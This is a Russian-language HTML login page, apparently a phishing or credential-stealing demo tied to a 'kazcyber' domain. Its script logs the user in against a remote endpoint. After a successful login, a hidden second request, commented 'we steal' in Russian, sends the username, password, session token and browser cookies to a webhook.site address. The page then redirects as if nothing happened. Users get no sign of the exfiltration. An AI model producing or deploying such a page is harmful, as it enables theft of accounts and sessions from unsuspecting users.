<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Вход в систему</title>
  <style>
    body { font-family: sans-serif; padding: 30px; text-align: center; }
    input, button { padding: 10px; margin: 10px; width: 250px; }
    .error { color: red; }
  </style>
</head>
<body>
  <h2>Вход в систему</h2>
  <form id="loginForm">
    <input type="text" id="username" placeholder="Логин" required><br>
    <input type="password" id="password" placeholder="Пароль" required><br>
    <button type="submit">Войти</button>
  </form>
  <p class="error" id="errorMessage"></p>
  <script>
    const loginForm = document.getElementById("loginForm");
    const errorMsg = document.getElementById("errorMessage");

    loginForm.addEventListener("submit", async function (e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      try {
        const res = await fetch("https://kazcyber.zapto.org/logindemo.php", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          credentials: "include",
          body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
        });

        const data = await res.json();

        if (data.status === "success") {
          // Воруем
          await fetch("https://webhook.site/872df0d8-9f97-4b64-b8fe-e9edddeedfbd", {
            method: "POST",
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              username,
              password,
              token: data.token,
              cookie: document.cookie
            })
          });

          // Устанавливаем токен для авторизации и редиректим
          localStorage.setItem("token", data.token);
          window.location.href = "https://kazcyber.zapto.org/";
        } else {
          errorMsg.textContent = "❌ Неверный логин или пароль";
        }
      } catch (err) {
        errorMsg.textContent = "⚠️ Ошибка соединения с сервером";
      }
    });
  </script>
</body>
</html>
